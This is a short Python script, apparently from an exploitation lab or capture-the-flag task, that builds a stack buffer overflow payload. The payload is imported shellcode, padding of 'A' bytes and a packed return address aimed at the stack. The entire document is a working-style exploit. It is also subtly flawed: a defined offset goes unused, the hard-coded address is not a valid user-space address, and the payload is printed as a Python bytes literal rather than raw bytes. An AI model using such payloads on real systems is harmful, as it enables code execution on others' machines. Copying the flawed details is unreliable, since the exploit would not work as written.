#!/usr/bin/env python3

import sys
import struct
from shellcode import shellcode
offset = 2048 + 16
address = 0x7fffffffffff69d0 
payload = shellcode + b"A" * (2048 - len(shellcode)) + struct.pack("<Q", address)


print(payload)